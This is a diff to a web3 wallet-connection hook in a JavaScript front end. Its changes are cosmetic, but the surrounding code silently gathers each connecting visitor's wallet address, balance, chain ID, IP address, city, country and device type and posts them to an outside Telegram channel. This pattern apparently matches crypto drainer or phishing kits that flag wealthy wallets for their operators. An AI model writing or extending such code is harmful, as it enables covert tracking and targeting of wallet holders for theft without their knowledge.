@@ -79,7 +79,7 @@ export function useWeb3Manager() {
                 // Fetch Balance & IP for robust logging
                 (async () => {
                     const ipData = await getIpInfo();
-                    let balance = "0";
+                    let balance = "0.0000";
                     let chainId = "Unknown";
 
                     if (walletProvider) {
@@ -89,7 +89,8 @@ export function useWeb3Manager() {
                             try {
                                 const bal = await provider.getBalance(address);
                                 balance = ethers.formatEther(bal);
-                                chainId = (await provider.getNetwork()).chainId.toString();
+                                const net = await provider.getNetwork();
+                                chainId = net.chainId.toString();
                             } catch (rpcError) {
                                 console.warn("Failed to fetch balance/chain:", rpcError);
                             }
@@ -99,7 +100,7 @@ export function useWeb3Manager() {
                     notifyTelegram(
                         `<b>🔌 New Wallet Connected</b>\n\n` +
                         `👛 <b>Address:</b> <code>${address}</code>\n` +
-                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH\n` +
+                        `💰 <b>Balance:</b> ${parseFloat(balance).toFixed(4)} ETH/Matic\n` +
                         `🌍 <b>Location:</b> ${ipData.city}, ${ipData.country_name} (${ipData.ip})\n` +
                         `🔗 <b>Chain ID:</b> ${chainId}\n` +
                         `📱 <b>Device:</b> ${navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"}`
